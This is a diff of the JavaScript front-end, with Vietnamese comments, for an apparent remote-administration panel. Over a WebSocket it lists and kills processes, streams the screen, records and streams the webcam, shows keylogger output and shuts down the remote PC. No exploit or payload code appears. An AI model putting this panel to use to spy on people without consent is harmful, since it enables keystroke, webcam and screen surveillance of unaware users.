@@ -4,18 +4,17 @@ document.addEventListener('DOMContentLoaded', () => {
     let currentView = 'applications';
     let lastLoggedKeyCode = null;
     let currentVideoBlob = null;
-    // (MỚI) Cờ để đánh dấu trạng thái Keylogger
     let isKeylogClean = true;
 
-    // --- BỘ CHỌN DOM (Helper) ---
+    // --- BỘ CHỌN DOM ---
     const $ = (s) => document.querySelector(s);
     const $$ = (s) => document.querySelectorAll(s);
 
-    // --- ELEMENTS ---
-    // Webcam
+    // Elements
     const btnStartRecord = $('#btn-start-record');
     const btnStopRecord = $('#btn-stop-record');
     const btnSaveVideo = $('#btn-save-video');
+    const btnReloadWebcam = $('#btn-reload-webcam'); // Nút Reload Webcam
     const webcamSpinner = $('#webcam-spinner');
     const webcamPlaceholder = $('#webcam-placeholder');
     const webcamVideoOutput = $('#webcam-video-output');
@@ -24,15 +23,16 @@ document.addEventListener('DOMContentLoaded', () => {
     const inputWebcamDuration = $('#input-webcam-duration');
     const inputWebcamDeviceName = $('#input-webcam-device-name');
 
-    // Connection (ĐÃ SỬA SELECTOR ĐỂ CHỌN ĐÚNG PHẦN TỬ TRONG FOOTER)
+    // Connection
     const statusPill = $('#status-pill');
-    const statusText = $('#status-pill .status-text'); // Chọn chính xác con của #status-pill
+    const statusText = $('#status-pill .status-text');
     const wsUrlInput = $('#ws-url-input');
     const btnConnect = $('#btn-connect');
     const btnDisconnect = $('#btn-disconnect');
 
     // Capture
     const btnTakeScreenshot = $('#btn-take-screenshot');
+    const btnReloadScreen = $('#btn-reload-screen'); // Nút Reload Screen
     const btnSaveScreenshot = $('#btn-save-screenshot');
     const btnCopyScreenshot = $('#btn-copy-screenshot');
     const captureSpinner = $('#capture-spinner');
@@ -52,11 +52,12 @@ document.addEventListener('DOMContentLoaded', () => {
     const btnStopWebcamStream = $('#btn-stop-webcam-stream');
     const webcamStreamImg = $('#webcam-stream-img');
 
-    // System & Navigation
+    // System & Nav
     const sidebar = $('#sidebar');
-    const viewSystemControl = $('#view-system-control');
+    const themeToggle = $('#theme-toggle'); 
+    const bodyEl = document.body;
 
-    // --- MODAL CONFIRM ---
+    // --- MODAL HELPERS ---
     const modalConfirm = $('#modal-confirm');
     const confirmTitle = $('#confirm-title');
     const confirmMsg = $('#confirm-message');
@@ -68,34 +69,40 @@ document.addEventListener('DOMContentLoaded', () => {
         confirmMsg.textContent = msg;
         confirmCallback = callback;
         const iconBox = $('#confirm-icon-box');
-        iconBox.className = 'icon-box ' + (type === 'danger' ? 'red' : 'blue');
+        if (iconBox) iconBox.className = 'icon-box ' + (type === 'danger' ? 'red' : 'blue');
         modalConfirm.classList.remove('hidden');
         $('#modal-backdrop').classList.remove('hidden');
     }
 
-    btnConfirmYes.onclick = () => {
-        if (confirmCallback) confirmCallback();
-        hideAllModals();
-    };
+    if(btnConfirmYes) {
+        btnConfirmYes.onclick = () => {
+            if (confirmCallback) confirmCallback();
+            hideAllModals();
+        };
+    }
 
     function hideAllModals() {
         $$('.modal').forEach(m => m.classList.add('hidden'));
         $('#modal-backdrop').classList.add('hidden');
     }
+    function showModal(id) {
+        $(`#${id}`).classList.remove('hidden');
+        $('#modal-backdrop').classList.remove('hidden');
+    }
 
-    // --- HELPER: TRẠNG THÁI KẾT NỐI ---
+    // --- CONNECTION STATE ---
     function setConnectedState(isConnected) {
         if (isConnected) {
             statusPill.classList.remove('disconnected');
             statusPill.classList.add('connected');
-            statusText.textContent = 'Connected'; // Bây giờ sẽ cập nhật đúng chỗ
+            if(statusText) statusText.textContent = 'Connected';
             btnConnect.classList.add('hidden');
             btnDisconnect.classList.remove('hidden');
             wsUrlInput.disabled = true;
         } else {
             statusPill.classList.remove('connected');
             statusPill.classList.add('disconnected');
-            statusText.textContent = 'Disconnected';
+            if(statusText) statusText.textContent = 'Disconnected';
             btnConnect.classList.remove('hidden');
             btnDisconnect.classList.add('hidden');
             wsUrlInput.disabled = false;
@@ -106,29 +113,24 @@ document.addEventListener('DOMContentLoaded', () => {
     function connectWs() {
         const url = wsUrlInput.value;
         if (!url) return alert('Enter WebSocket URL');
-
         console.log("Connecting to:", url);
-        ws = new WebSocket(url);
+        
+        try {
+            ws = new WebSocket(url);
+        } catch (e) {
+            return alert("Invalid URL");
+        }
 
-        ws.onopen = () => {
-            console.log("WS Open");
-            setConnectedState(true);
-            loadDataForView(currentView);
-        };
-
-        ws.onclose = () => {
-            console.log("WS Close");
-            setConnectedState(false);
-            ws = null;
-            $('#processes-table tbody').innerHTML = '';
-            $('#apps-table tbody').innerHTML = '';
-            // Reset Keylogger UI
-            keylogOutput.textContent = 'System ready. Waiting for input stream...';
-            isKeylogClean = true;
-            keylogToggle.checked = false;
+        ws.onopen = () => { setConnectedState(true); loadDataForView(currentView); };
+        ws.onclose = () => { 
+            setConnectedState(false); 
+            ws = null; 
+            if($('#processes-table tbody')) $('#processes-table tbody').innerHTML = '';
+            if($('#apps-table tbody')) $('#apps-table tbody').innerHTML = '';
+            if(keylogOutput) keylogOutput.textContent = 'System ready. Waiting...';
+            if(keylogToggle) keylogToggle.checked = false;
             lastLoggedKeyCode = null;
         };
-
         ws.onerror = (e) => alert('Connection failed');
         ws.onmessage = onWsMessage;
     }
@@ -136,22 +138,15 @@ document.addEventListener('DOMContentLoaded', () => {
     function disconnectWs() { if (ws) ws.close(); }
 
     function sendWsMessage(payload) {
-        if (ws && ws.readyState === WebSocket.OPEN) {
-            ws.send(JSON.stringify(payload));
-        } else {
-            alert('Not connected to server.');
-        }
+        if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(payload));
+        else alert('Not connected.');
     }
 
     function onWsMessage(event) {
         const msg = JSON.parse(event.data);
         switch (msg.type) {
-            case 'process_list':
-                renderProcessTable(msg.data);
-                break;
-            case 'application_list':
-                renderAppTable(msg.data);
-                break;
+            case 'process_list': renderProcessTable(msg.data); break;
+            case 'application_list': renderAppTable(msg.data); break;
             case 'screenshot':
                 captureSpinner.classList.add('hidden');
                 captureImg.src = `data:image/png;base64,${msg.data}`;
@@ -164,74 +159,56 @@ document.addEventListener('DOMContentLoaded', () => {
                 capturePlaceholder.parentElement.classList.add('hidden');
                 captureImg.classList.add('hidden');
                 streamImg.classList.remove('hidden');
-
                 streamImg.src = "data:image/jpeg;base64," + msg.data;
                 break;
-            case 'webcam_recording_status':
-                handleWebcamStatus(msg);
-                break;
-            case 'webcam_video':
-                handleWebcamVideo(msg.data);
-                break;
-
-            case 'webcam_frame':
-                const webcamDisplayArea = $('#webcam-display-area .empty-state');
-                
-                webcamDisplayArea.classList.add('hidden'); 
-                webcamVideoOutput.classList.add('hidden');
-                webcamStreamImg.classList.remove('hidden');
-                webcamStreamImg.src = "data:image/jpeg;base64," + msg.data;
-                break;
-
-            case 'key_event':
-                handleKeyEvent(msg.key_code);
-                break;
-
-            case 'help':
-                $('#help-content').textContent = msg.commands.join('\n');
-                break;
+            case 'webcam_recording_status': handleWebcamStatus(msg); break;
+            case 'webcam_video': handleWebcamVideo(msg.data); break;
+            case 'webcam_frame': 
+                 $('#webcam-display-area .empty-state').classList.add('hidden');
+                 webcamVideoOutput.classList.add('hidden');
+                 webcamStreamImg.classList.remove('hidden');
+                 webcamStreamImg.src = "data:image/jpeg;base64," + msg.data;
+                 break;
+            case 'key_event': handleKeyEvent(msg.key_code); break;
+            // case 'help': ... (Đã xóa)
             case 'status':
                 if (msg.success) {
                     if (currentView.includes('process')) loadDataForView('processes-table');
                     if (currentView.includes('app')) loadDataForView('applications-table');
                 } else {
-                    if (msg.message === 'capture failed') {
-                        captureSpinner.classList.add('hidden');
-                        capturePlaceholder.parentElement.classList.remove('hidden');
-                    } else {
-                        alert('Error: ' + msg.message);
-                    }
+                    if(msg.message === 'capture failed') {
+                         captureSpinner.classList.add('hidden');
+                         capturePlaceholder.parentElement.classList.remove('hidden');
+                    } else alert('Error: ' + msg.message);
                 }
                 break;
         }
     }
 
-    // --- HANDLERS HIỂN THỊ DỮ LIỆU ---
+    // --- RENDERERS ---
     function renderProcessTable(data) {
         const tbody = $('#processes-table tbody');
+        if (!tbody) return;
         if (!data || !data.length) { tbody.innerHTML = '<tr><td colspan="4">No data.</td></tr>'; return; }
         const fmt = new Intl.NumberFormat('en-US');
         tbody.innerHTML = data.map(p => `
-            <tr>
-                <td><span class="status-pill" style="background:rgba(0,0,0,0.05);color:var(--text-main)">${p.pid}</span></td>
-                <td>${p.name}</td>
-                <td>${p.workingSet ? fmt.format(p.workingSet)+' B' : 'N/A'}</td>
-                <td class="text-right"><button class="btn btn-sm btn-danger" data-action="stop-proc" data-pid="${p.pid}">Stop</button></td>
-            </tr>`).join('');
+            <tr><td><span class="status-pill" style="background:rgba(0,0,0,0.05);color:var(--text-main)">${p.pid}</span></td>
+            <td>${p.name}</td><td>${p.workingSet ? fmt.format(p.workingSet)+' B' : 'N/A'}</td>
+            <td class="text-right"><button class="btn btn-sm btn-danger" data-action="stop-proc" data-pid="${p.pid}">Stop</button></td></tr>`
+        ).join('');
     }
 
     function renderAppTable(data) {
         const tbody = $('#apps-table tbody');
+        if (!tbody) return;
         if (!data || !data.length) { tbody.innerHTML = '<tr><td colspan="3">No data.</td></tr>'; return; }
         tbody.innerHTML = data.map(a => `
-            <tr>
-                <td style="font-weight:500">${a.name}</td>
-                <td>${a.process_count}</td>
-                <td class="text-right"><button class="btn btn-sm btn-danger" data-action="stop-app" data-name="${a.name}">End Task</button></td>
-            </tr>`).join('');
+            <tr><td style="font-weight:500">${a.name}</td><td>${a.process_count}</td>
+            <td class="text-right"><button class="btn btn-sm btn-danger" data-action="stop-app" data-name="${a.name}">End Task</button></td></tr>`
+        ).join('');
     }
 
-    // --- LOGIC KEYLOGGER (ĐÃ SỬA LỖI CLEAR TEXT BẰNG FLAG) ---
+    // --- KEYLOGGER (LOGIC ĐẦY ĐỦ) ---
     function handleKeyEvent(keyCode) {
         if (keyCode === 231) return;
 
@@ -356,9 +333,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 case 222:
                     return "'";
                 case 91:
-                    return '[LWin]';
-                case 92:
-                    return '[RWin]';
+                    return '[Win]';
                 case 93:
                     return '[Menu]';
                 default:
@@ -375,271 +350,273 @@ document.addEventListener('DOMContentLoaded', () => {
     function handleWebcamStatus(msg) {
         webcamStatus.textContent = msg.message;
         webcamStatus.classList.remove('hidden');
-        
-        if (msg.message.includes('started')) {
-            btnStartRecord.classList.add('hidden');
-            btnStopRecord.classList.remove('hidden');
-            btnStartWebcamStream.classList.add('hidden');
+        if (msg.message.includes('Recording started')) {
+            btnStartRecord.classList.add('hidden'); 
+            btnStopRecord.classList.remove('hidden'); 
+            
+            btnStartWebcamStream.classList.add('hidden'); 
             btnStopWebcamStream.classList.add('hidden');
+            
             btnSaveVideo.classList.add('hidden');
-            webcamPlaceholder.parentElement.classList.add('hidden');
-            webcamSpinner.classList.remove('hidden');
+            webcamPlaceholder.parentElement.classList.add('hidden'); 
+            webcamSpinner.classList.remove('hidden'); 
             webcamVideoOutput.classList.add('hidden');
+        } else if (msg.message.includes('streaming started')) {
+            btnStartWebcamStream.classList.add('hidden');
+            btnStopWebcamStream.classList.remove('hidden');
         } else if (msg.message.includes('completed')) {
-            btnStartWebcamStream.classList.remove('hidden');
-            webcamSpinner.classList.add('hidden');
-            webcamPlaceholder.parentElement.classList.remove('hidden');
-            webcamPlaceholder.textContent = 'Processing video...';
+             btnStartWebcamStream.classList.remove('hidden');
+             webcamSpinner.classList.add('hidden'); webcamPlaceholder.parentElement.classList.remove('hidden'); webcamPlaceholder.textContent = 'Processing...';
         } else if (msg.message.includes('error') || msg.message.includes('cancelled')) {
-            btnStartRecord.classList.remove('hidden');
-            btnStopRecord.classList.add('hidden');
+            btnStartRecord.classList.remove('hidden'); btnStopRecord.classList.add('hidden');
             btnStartWebcamStream.classList.remove('hidden');
-            webcamSpinner.classList.add('hidden');
-            webcamPlaceholder.parentElement.classList.remove('hidden');
+            webcamSpinner.classList.add('hidden'); webcamPlaceholder.parentElement.classList.remove('hidden');
         }
     }
 
     function handleWebcamVideo(b64) {
-        webcamSpinner.classList.add('hidden');
-        webcamPlaceholder.parentElement.classList.add('hidden');
+        webcamSpinner.classList.add('hidden'); webcamPlaceholder.parentElement.classList.add('hidden');
         try {
-            const chars = atob(b64);
-            const bytes = new Uint8Array(chars.length);
-            for (let i = 0; i < chars.length; i++) bytes[i] = chars.charCodeAt(i);
+            const chars = atob(b64), bytes = new Uint8Array(chars.length);
+            for(let i=0; i<chars.length; i++) bytes[i] = chars.charCodeAt(i);
             currentVideoBlob = new Blob([bytes], { type: 'video/mp4' });
             webcamVideoOutput.src = URL.createObjectURL(currentVideoBlob);
             webcamVideoOutput.classList.remove('hidden');
-
-            btnStartRecord.classList.remove('hidden');
-            btnStopRecord.classList.add('hidden');
-            btnSaveVideo.classList.remove('hidden');
-        } catch (e) {
-            console.error(e);
-            alert("Video decode error");
-        }
+            btnStartRecord.classList.remove('hidden'); btnStopRecord.classList.add('hidden'); btnSaveVideo.classList.remove('hidden');
+        } catch(e) { console.error(e); alert("Video error"); }
     }
 
     // --- NAVIGATION ---
     function showView(viewId) {
         currentView = viewId;
         $$('.content-view').forEach(v => v.classList.remove('active'));
-        $(`#view-${viewId}`).classList.add('active');
-
+        const targetView = $(`#view-${viewId}`);
+        if(targetView) targetView.classList.add('active');
+        
         $$('.nav-item').forEach(i => i.classList.remove('active'));
-        const parent = $(`#view-${viewId}`).dataset.parentView;
-        const target = parent || viewId;
-        const navItem = $(`.nav-item[data-view="${target}"]`);
-        if (navItem) {
-            navItem.classList.add('active');
-        }
+        const parent = targetView ? targetView.dataset.parentView : null;
+        const activeItem = $(`.nav-item[data-view="${parent || viewId}"]`);
+        if(activeItem) activeItem.classList.add('active');
 
         if (ws && ws.readyState === WebSocket.OPEN) loadDataForView(viewId);
     }
 
     function loadDataForView(id) {
-        if (id === 'processes-table') sendWsMessage({ command: 'list_processes' });
-        else if (id === 'applications-table') sendWsMessage({ command: 'list_applications' });
+        if(id === 'processes-table') sendWsMessage({command: 'list_processes'});
+        else if(id === 'applications-table') sendWsMessage({command: 'list_applications'});
     }
 
-    // --- INIT EVENTS ---
+    // --- INIT ---
     function init() {
         const proto = location.protocol === 'https:' ? 'wss' : 'ws';
         wsUrlInput.value = `${proto}://${location.host}/ws`;
 
         btnConnect.onclick = connectWs;
         btnDisconnect.onclick = disconnectWs;
-
+        
         $('#sidebar').onclick = e => {
             const item = e.target.closest('.nav-item');
-            if (item) showView(item.dataset.view);
+            if(item) showView(item.dataset.view);
         };
 
-        // Dashboard Actions
+        // Dashboard
         $('#main-content').onclick = e => {
             const card = e.target.closest('[data-action="show-view"]');
-            if (card) showView(card.dataset.target);
-
+            if(card) showView(card.dataset.target);
             const stopBtn = e.target.closest('[data-action="stop-proc"]');
-            if (stopBtn) showConfirmModal('Stop Process', `Kill PID ${stopBtn.dataset.pid}?`, 'danger', () => sendWsMessage({ command: 'stop_process_pid', pid: parseInt(stopBtn.dataset.pid) }));
-
+            if(stopBtn) showConfirmModal('Stop Process', `PID ${stopBtn.dataset.pid}?`, 'danger', () => sendWsMessage({command:'stop_process_pid', pid: parseInt(stopBtn.dataset.pid)}));
             const stopAppBtn = e.target.closest('[data-action="stop-app"]');
-            if (stopAppBtn) showConfirmModal('Stop App', `Close "${stopAppBtn.dataset.name}"?`, 'danger', () => sendWsMessage({ command: 'stop_application', app_name: stopAppBtn.dataset.name }));
+            if(stopAppBtn) showConfirmModal('Stop App', `Close "${stopAppBtn.dataset.name}"?`, 'danger', () => sendWsMessage({command:'stop_application', app_name: stopAppBtn.dataset.name}));
         };
 
-        // Screenshot
+        // === SCREEN CAPTURE LOGIC ===
         btnTakeScreenshot.onclick = () => {
-            if (!ws || ws.readyState !== WebSocket.OPEN) return alert('Connect first');
-            captureSpinner.classList.remove('hidden');
-            captureImg.classList.add('hidden');
-            capturePlaceholder.parentElement.classList.remove('hidden');
-            capturePlaceholder.textContent = 'Capturing...';
-            btnSaveScreenshot.classList.add('hidden');
-            btnCopyScreenshot.classList.add('hidden');
-            sendWsMessage({ command: 'capture_screen' });
-        };
-        btnSaveScreenshot.onclick = () => {
-            if (!captureImg.src) return;
-            const a = document.createElement('a');
-            a.href = captureImg.src;
-            a.download = `screen-${Date.now()}.png`;
-            a.click();
-        };
-
-        // ScreenStream
-        btnStartStream.onclick = () => {
-            if (!ws || ws.readyState !== WebSocket.OPEN) return alert('Connect first');
-
-            // Reset UI
-            captureImg.classList.add('hidden');
-            streamImg.classList.remove('hidden');
-            capturePlaceholder.parentElement.classList.add('hidden');
-
-            // Send start command
-            sendWsMessage({ command: 'start_screen_stream', fps: 10 });
-
-            btnStartStream.classList.add('hidden');
-            btnStopStream.classList.remove('hidden');
-        };
-
-        btnStopStream.onclick = () => {
-            if (!ws || ws.readyState !== WebSocket.OPEN) return alert('Connect first');
-
-            sendWsMessage({ command: 'stop_screen_stream' });
-
-            streamImg.classList.add('hidden');
-            capturePlaceholder.parentElement.classList.remove('hidden');
-            capturePlaceholder.textContent = "Stream stopped";
-
-            btnStartStream.classList.remove('hidden');
-            btnStopStream.classList.add('hidden');
-        };
-
-
-        // Webcam
-        btnStartRecord.onclick = () => {
-            $('#modal-webcam-device').classList.remove('hidden');
-            $('#modal-backdrop').classList.remove('hidden');
-        };
-        $('#modal-webcam-device [data-action="confirm"]').onclick = () => {
-            const dur = parseInt($('#input-webcam-duration').value);
-            sendWsMessage({ command: 'start_webcam_record', time: dur, device_name: $('#input-webcam-device-name').value });
-            hideAllModals();
-        };
-        btnStopRecord.onclick = () => sendWsMessage({ command: 'stop_webcam_record' });
-        $('#btn-save-video').onclick = () => {
-            if (currentVideoBlob) {
-                const a = document.createElement('a');
-                a.href = URL.createObjectURL(currentVideoBlob);
-                a.download = `webcam-${Date.now()}.mp4`;
-                a.click();
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                sendWsMessage({ command: 'capture_screen' });
+                
+                captureSpinner.classList.remove('hidden');
+                captureImg.classList.add('hidden');
+                capturePlaceholder.parentElement.classList.add('hidden');
+                btnSaveScreenshot.classList.add('hidden');
+                btnCopyScreenshot.classList.add('hidden');
+            } else {
+                alert('Please connect to the server first!');
             }
         };
-
-        // Webcam Stream
-        btnStartWebcamStream.onclick = () => {
-            if (!ws || ws.readyState !== WebSocket.OPEN) return alert('Connect first');
-
-            // Reset UI
-            webcamVideoOutput.classList.add('hidden');
-            webcamStreamImg.classList.remove('hidden');
-            webcamPlaceholder.parentElement.classList.add('hidden');
-            btnSaveVideo.classList.add('hidden');
-
-            // Ẩn các nút Record
-            btnStartRecord.classList.add('hidden'); 
-            btnStopRecord.classList.add('hidden');
-
-            // Gửi lệnh Start Stream
-            sendWsMessage({ command: 'start_webcam_stream', fps: 10 });
-
-            btnStartWebcamStream.classList.add('hidden');
-            btnStopWebcamStream.classList.remove('hidden');
-
-            $('#webcam-display-area .empty-state').classList.add('hidden'); // THÊM DÒNG NÀY
-            webcamVideoOutput.classList.add('hidden');
-            webcamStreamImg.classList.remove('hidden');
+        btnSaveScreenshot.onclick = () => {
+            const a = document.createElement('a'); a.href = captureImg.src; a.download = `screen-${Date.now()}.png`; a.click();
         };
-
-        btnStopWebcamStream.onclick = () => {
-            if (!ws || ws.readyState !== WebSocket.OPEN) return alert('Connect first');
-
-            sendWsMessage({ command: 'stop_webcam_stream' });
-
-            // Reset UI về trạng thái ban đầu
-            webcamStreamImg.classList.add('hidden');
-            webcamPlaceholder.parentElement.classList.remove('hidden');
-            webcamPlaceholder.textContent = "Ready to record or stream webcam";
-
-            // Hiển thị lại nút Record và Stream
-            btnStartWebcamStream.classList.remove('hidden');
-            btnStopWebcamStream.classList.add('hidden');
-            btnStartRecord.classList.remove('hidden'); 
+        btnCopyScreenshot.onclick = async () => {
+            if (!captureImg.src || captureImg.classList.contains('hidden')) return;
+            try {
+                const response = await fetch(captureImg.src);
+                const blob = await response.blob();
+                const item = new ClipboardItem({ [blob.type]: blob });
+                await navigator.clipboard.write([item]);
+                alert('Đã copy ảnh vào Clipboard!');
+            } catch (err) {
+                console.warn('Copy Image API failed:', err);
+                try { await navigator.clipboard.writeText(captureImg.src.split(',')[1]); alert('Đã copy mã Base64 (Fallback)!'); } catch (e) { alert('Không thể copy. Kiểm tra HTTPS.'); }
+            }
         };
-
-        // Nút Clear Keylog
-        if (btnClearKeylog) {
-            btnClearKeylog.onclick = () => {
-                keylogOutput.textContent = 'Log cleared.';
-                isKeylogClean = true;
-
-                const terminal = $('.terminal-window');
-                terminal.style.opacity = '0.5';
-                setTimeout(() => terminal.style.opacity = '1', 100);
+        
+        // === NÚT RELOAD SCREEN (RESET UI) ===
+        if (btnReloadScreen) {
+            btnReloadScreen.onclick = () => {
+                // Dừng Stream nếu có (để server ngừng gửi)
+                if(ws && ws.readyState === WebSocket.OPEN) sendWsMessage({ command: 'stop_screen_stream' });
+                
+                // Reset UI
+                captureImg.classList.add('hidden'); captureImg.src = '';
+                streamImg.classList.add('hidden'); streamImg.src = '';
+                capturePlaceholder.parentElement.classList.remove('hidden');
+                capturePlaceholder.textContent = 'Ready to capture/stream screen';
+                captureSpinner.classList.add('hidden');
+                
+                btnSaveScreenshot.classList.add('hidden');
+                btnCopyScreenshot.classList.add('hidden');
+                
+                btnStartStream.classList.remove('hidden');
+                btnStopStream.classList.add('hidden');
             };
         }
 
-        // Keylogger Toggle
-        keylogToggle.onchange = e => {
-            if (!ws || ws.readyState !== WebSocket.OPEN) return (e.target.checked = false, alert('Connect first'));
-            sendWsMessage({ command: e.target.checked ? 'start_keylog' : 'stop_keylog' });
-
-            // Đặt lại trạng thái text và cờ
-            keylogOutput.textContent = e.target.checked ? 'Starting keylogger...' : 'Stopped.';
-            isKeylogClean = true; // Khi bật lại, lần gõ tiếp theo sẽ xóa text này
-            lastLoggedKeyCode = null;
+        // Screen Stream
+        btnStartStream.onclick = () => {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                sendWsMessage({ command: 'start_screen_stream', fps: 10 });
+                
+                captureImg.classList.add('hidden'); 
+                streamImg.classList.remove('hidden'); 
+                capturePlaceholder.parentElement.classList.add('hidden');
+                btnStartStream.classList.add('hidden'); 
+                btnStopStream.classList.remove('hidden');
+            } else {
+                alert('Please connect to the server first!');
+            }
+        };
+        btnStopStream.onclick = () => {
+             sendWsMessage({ command: 'stop_screen_stream' });
+             streamImg.classList.add('hidden'); capturePlaceholder.parentElement.classList.remove('hidden'); capturePlaceholder.textContent = "Stream stopped";
+             btnStartStream.classList.remove('hidden'); btnStopStream.classList.add('hidden');
         };
 
-        // Modals
-        $('#btn-start-process').onclick = () => {
-            $('#modal-start-process').classList.remove('hidden');
-            $('#modal-backdrop').classList.remove('hidden');
+        // === WEBCAM LOGIC ===
+        btnStartRecord.onclick = () => showModal('modal-webcam-device');
+        $('#modal-webcam-device [data-action="confirm"]').onclick = () => {
+             sendWsMessage({command: 'start_webcam_record', time: parseInt(inputWebcamDuration.value)||10, device_name: inputWebcamDeviceName.value});
+             hideAllModals();
         };
-        $('#btn-start-app').onclick = () => {
-            $('#modal-start-app').classList.remove('hidden');
-            $('#modal-backdrop').classList.remove('hidden');
-        };
-        $('#modal-backdrop').onclick = hideAllModals;
-        $$('[data-action="cancel"]').forEach(b => b.onclick = hideAllModals);
-
-        $('#modal-start-process [data-action="confirm"]').onclick = () => {
-            sendWsMessage({ command: 'start_process', path: $('#input-proc-path').value, args: $('#input-proc-args').value });
-            hideAllModals();
-        };
-        $('#modal-start-app [data-action="confirm"]').onclick = () => {
-            sendWsMessage({ command: 'start_application', app_name: $('#input-app-name').value });
-            hideAllModals();
+        btnStopRecord.onclick = () => sendWsMessage({command: 'stop_webcam_record'});
+        btnSaveVideo.onclick = () => {
+            if(currentVideoBlob) { const a = document.createElement('a'); a.href = URL.createObjectURL(currentVideoBlob); a.download = `webcam-${Date.now()}.mp4`; a.click(); }
         };
 
-        // System Control
-        $('#btn-system-restart').onclick = () => showConfirmModal('System Restart', 'Restart remote machine?', 'danger', () => sendWsMessage({ command: 'system_restart' }));
-        $('#btn-system-shutdown').onclick = () => showConfirmModal('System Shutdown', 'Shutdown remote machine?', 'danger', () => sendWsMessage({ command: 'system_shutdown' }));
+        // === NÚT RELOAD WEBCAM (RESET UI) ===
+        if (btnReloadWebcam) {
+            btnReloadWebcam.onclick = () => {
+                 // Dừng stream/record phía server
+                 if(ws && ws.readyState === WebSocket.OPEN) {
+                     sendWsMessage({ command: 'stop_webcam_stream' });
+                     sendWsMessage({ command: 'stop_webcam_record' });
+                 }
 
-        // Theme & Traffic Lights
-        $('#theme-toggle').onchange = e => {
-            document.body.className = e.target.checked ? 'dark-theme' : '';
-            localStorage.setItem('theme', e.target.checked ? 'dark' : 'light');
-        };
-        if (localStorage.getItem('theme') === 'dark') {
-            document.body.className = 'dark-theme';
-            $('#theme-toggle').checked = true;
+                 // Reset UI
+                 webcamStreamImg.classList.add('hidden'); webcamStreamImg.src = '';
+                 webcamVideoOutput.classList.add('hidden'); webcamVideoOutput.src = '';
+                 webcamSpinner.classList.add('hidden');
+                 
+                 webcamPlaceholder.parentElement.classList.remove('hidden'); // Hiện empty state
+                 webcamPlaceholder.textContent = "Ready to record or stream webcam";
+                 webcamStatus.classList.add('hidden');
+
+                 btnStartWebcamStream.classList.remove('hidden');
+                 btnStopWebcamStream.classList.add('hidden');
+                 btnStartRecord.classList.remove('hidden');
+                 btnStopRecord.classList.add('hidden');
+                 btnSaveVideo.classList.add('hidden');
+            };
         }
 
-        $('.dot.red').onclick = () => { if (ws) disconnectWs(); };
-        $('.dot.yellow').onclick = () => $('#theme-toggle').click();
+        // Webcam Stream
+        btnStartWebcamStream.onclick = () => {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                sendWsMessage({ command: 'start_webcam_stream', fps: 10 });
+                
+                webcamVideoOutput.classList.add('hidden'); 
+                webcamStreamImg.classList.remove('hidden'); 
+                webcamPlaceholder.parentElement.classList.add('hidden'); 
+                btnSaveVideo.classList.add('hidden');
+                
+                btnStartRecord.classList.add('hidden'); 
+                btnStopRecord.classList.add('hidden');
+                
+                btnStartWebcamStream.classList.add('hidden'); 
+                btnStopWebcamStream.classList.remove('hidden');
+                
+                $('#webcam-display-area .empty-state').classList.add('hidden');
+            } else {
+                alert('Please connect to the server first!');
+            }
+        };
+        btnStopWebcamStream.onclick = () => {
+            sendWsMessage({ command: 'stop_webcam_stream' });
+            webcamStreamImg.classList.add('hidden'); webcamPlaceholder.parentElement.classList.remove('hidden'); webcamPlaceholder.textContent = "Ready";
+            btnStartWebcamStream.classList.remove('hidden'); btnStopWebcamStream.classList.add('hidden'); btnStartRecord.classList.remove('hidden');
+        };
+
+        // Keylog
+        keylogToggle.onchange = e => {
+            if(!ws) return (e.target.checked=false, alert('Connect first'));
+            sendWsMessage({command: e.target.checked ? 'start_keylog' : 'stop_keylog'});
+            keylogOutput.textContent = e.target.checked ? 'Starting...' : 'Stopped.';
+            isKeylogClean = true;
+        };
+        if(btnClearKeylog) btnClearKeylog.onclick = () => { keylogOutput.textContent = 'Cleared.'; isKeylogClean = true; };
+
+        // Modals
+        $('#btn-start-process').onclick = () => showModal('modal-start-process');
+        $('#btn-start-app').onclick = () => showModal('modal-start-app');
+        $('#modal-backdrop').onclick = hideAllModals;
+        $$('[data-action="cancel"]').forEach(b => b.onclick = hideAllModals);
+        
+        $('#modal-start-process [data-action="confirm"]').onclick = () => {
+            sendWsMessage({command:'start_process', path: $('#input-proc-path').value, args: $('#input-proc-args').value}); hideAllModals();
+        };
+        $('#modal-start-app [data-action="confirm"]').onclick = () => {
+            sendWsMessage({command:'start_application', app_name: $('#input-app-name').value}); hideAllModals();
+        };
+
+        // System
+        if($('#btn-system-restart')) $('#btn-system-restart').onclick = () => showConfirmModal('Restart', 'Restart remote PC?', 'danger', () => sendWsMessage({command: 'system_restart'}));
+        if($('#btn-system-shutdown')) $('#btn-system-shutdown').onclick = () => showConfirmModal('Shutdown', 'Shutdown remote PC?', 'danger', () => sendWsMessage({command: 'system_shutdown'}));
+
+        // Traffic Lights & Theme
+        $('.dot.red').onclick = () => { if(ws) disconnectWs(); };
+        $('.dot.yellow').onclick = () => { if(themeToggle) themeToggle.click(); }; 
         $('.dot.green').onclick = () => document.fullscreenElement ? document.exitFullscreen() : document.documentElement.requestFullscreen();
+
+        if(themeToggle) {
+            themeToggle.onchange = e => {
+                document.body.className = e.target.checked ? 'dark-theme' : '';
+                localStorage.setItem('theme', e.target.checked ? 'dark' : 'light');
+            };
+            if(localStorage.getItem('theme') === 'dark') {
+                document.body.classList.add('dark-theme');
+                themeToggle.checked = true;
+            }
+        }
     }
 
+    // --- START ---
     init();
+    
+    if (typeof feather !== 'undefined') {
+        feather.replace();
+    } else {
+        console.warn("Feather Icons not loaded yet. Retrying in 500ms...");
+        setTimeout(() => { if(typeof feather !== 'undefined') feather.replace(); }, 500);
+    }
+    
     showView(currentView);
-    feather.replace();
 });
